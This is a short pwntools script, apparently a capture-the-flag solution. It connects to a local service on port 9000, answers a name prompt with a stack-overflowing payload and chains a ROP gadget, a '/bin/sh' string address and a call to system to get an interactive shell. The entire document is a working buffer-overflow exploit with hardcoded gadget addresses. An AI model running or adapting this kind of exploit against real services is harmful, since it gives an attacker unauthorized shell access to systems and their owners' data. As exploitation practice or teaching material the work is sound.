from pwn import *

POP_RDI_RET = p64(0x401373)
SH_STR = p64(0x402036)
CALL_SYS = p64(0x40125c)
r = remote('localhost', 9000)
r.recvuntil(" Give us your name: ")

payload  = b'A'*32 + b"B"*8
payload += POP_RDI_RET
payload += SH_STR
payload += CALL_SYS

r.sendline(payload)
r.interactive()
